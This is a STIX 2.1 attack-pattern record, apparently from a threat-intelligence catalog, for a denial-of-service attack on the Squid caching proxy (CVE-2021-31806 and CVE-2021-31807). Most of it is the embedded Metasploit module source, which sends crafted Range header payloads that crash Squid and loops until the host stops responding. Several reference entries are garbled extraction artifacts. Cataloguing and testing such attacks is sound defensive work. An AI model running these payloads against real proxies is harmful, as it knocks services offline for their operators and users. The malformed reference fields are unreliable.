{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3b405093-b193-4803-83b5-513d4fa83ea6",
    "created": "2024-08-14T16:26:25.979361Z",
    "modified": "2024-08-14T16:26:25.979365Z",
    "name": "Squid Proxy Range Header DoS",
    "description": " The range handler in The Squid Caching Proxy Server 3.0-4.1.4 and 5.0.1-5.0.5 suffers from multiple vulnerabilities triggered by specific HTTP requests and responses.  These vulnerabilities allow remote attackers to cause a denial of service through specifically crafted requests. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/squid_range_dos.rb",
            "external_id": "squid_range_dos.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-31806"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-31807"
        },
        {
            "source_name": "reference",
            "url": "https://blogs.opera.com/security/2021/10/fuzzing-http-proxies-squid-part-2/"
        },
        {
            "source_name": "OptEnum.new(CVE",
            "external_id": ""
        },
        {
            "source_name": "CVE-2021-31806",
            "external_id": "CVE-2021-31807"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Squid Proxy Range Header DoS',\n        'Description' => %q{\n          The range handler in The Squid Caching Proxy Server 3.0-4.1.4 and\n          5.0.1-5.0.5 suffers from multiple vulnerabilities triggered\n          by specific HTTP requests and responses.\n\n          These vulnerabilities allow remote attackers to cause a\n          denial of service through specifically crafted requests.\n        },\n        'Author' => [\n          'Joshua Rogers' # Discoverer, and Metasploit Module\n        ],\n        'License' => MSF_LICENSE,\n        'Actions' => [\n          ['DOS', { 'Description' => 'Perform Denial of Service Against The Target' }]\n        ],\n        'DefaultAction' => 'DOS',\n        'References' => [\n          [ 'CVE', '2021-31806'],\n          [ 'CVE', '2021-31807'],\n          [ 'URL', 'https://blogs.opera.com/security/2021/10/fuzzing-http-proxies-squid-part-2/']\n        ],\n        'DisclosureDate' => '2021-05-27',\n        'Notes' => {\n          'Stability' => [ CRASH_SERVICE_DOWN ],\n          'Reliability' => [ ],\n          'SideEffects' => [ IOC_IN_LOGS ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(3128),\n        OptInt.new('REQUEST_COUNT', [ true, 'The number of requests to be sent, as well as the number of re-tries to confirm a dead host', 50 ]),\n        OptEnum.new('CVE', [\n          true, 'CVE to check/exploit', 'CVE-2021-31806',\n          ['CVE-2021-31806', 'CVE-2021-31807']\n        ]),\n      ]\n    )\n  end\n\n  def on_request_uri(cli, _request)\n    # The Last-Modified response header must be set such that Squid caches the page.\n    send_response(cli, '<html></html>', { 'Last-Modified' => 'Mon, 01 Jan 2020 00:00:00 GMT' })\n  end\n\n  def run\n    count = 0\n    error_count = 0 # The amount of connection errors from the server.\n    reqs = datastore['REQUEST_COUNT'] # The maximum amount of requests (with a valid response) to the server.\n\n    print_status(\"Sending #{reqs} DoS requests to #{peer}\")\n\n    start_service\n\n    while reqs > count\n      begin\n        res = req(datastore['CVE'])\n      rescue Errno::ECONNRESET\n        res = nil\n      end\n\n      if res && (res.code == 200) && (count == 0)\n        count = 1\n        print_status(\"Sent first request to #{rhost}:#{rport}\")\n      elsif res\n        print_status(\"Sent DoS request #{count} to #{rhost}:#{rport}\")\n        count += 1\n        error_count = 0\n\n        next # Host could be completely dead, or just waiting for another Squid child.\n      elsif count == 0\n        print_error('Cannot connect to host.')\n        return\n      end\n\n      error_count += 1\n      next unless error_count > reqs # If we cannot connect after `res` amount of attempts, assume the DoS was successful.\n\n      print_good('DoS completely successful.')\n      report_vuln(\n        host: rhost,\n        port: rport,\n        name: name,\n        refs: references\n      )\n      return\n    end\n    print_error('Looks like the host is not vulnerable.')\n  end\n\n  def req(cve)\n    case cve\n    when 'CVE-2021-31806'\n      sploit = cve_2021_31806\n    when 'CVE-2021-31807'\n      sploit = cve_2021_31807\n    end\n\n    send_request_raw({\n      'uri' => get_uri,\n      'headers' => {\n        'Host' => \"#{srvhost_addr}:#{srvport}\",\n        'Range' => sploit,\n        'Cache-Control' => 'public'\n      }\n    })\n  end\n\n  def cve_2021_31806\n    # This will cause Squid to assert with \"http->out.offset <= start\"\n    %(bytes=0-0,-0,-1)\n  end\n\n  def cve_2021_31807\n    # This will cause Squid to assert with \"!http->range_iter.debt() == !http->range_iter.currentSpec()\"\n    %(bytes=0-0,-4,-0)\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2021-05-27"
}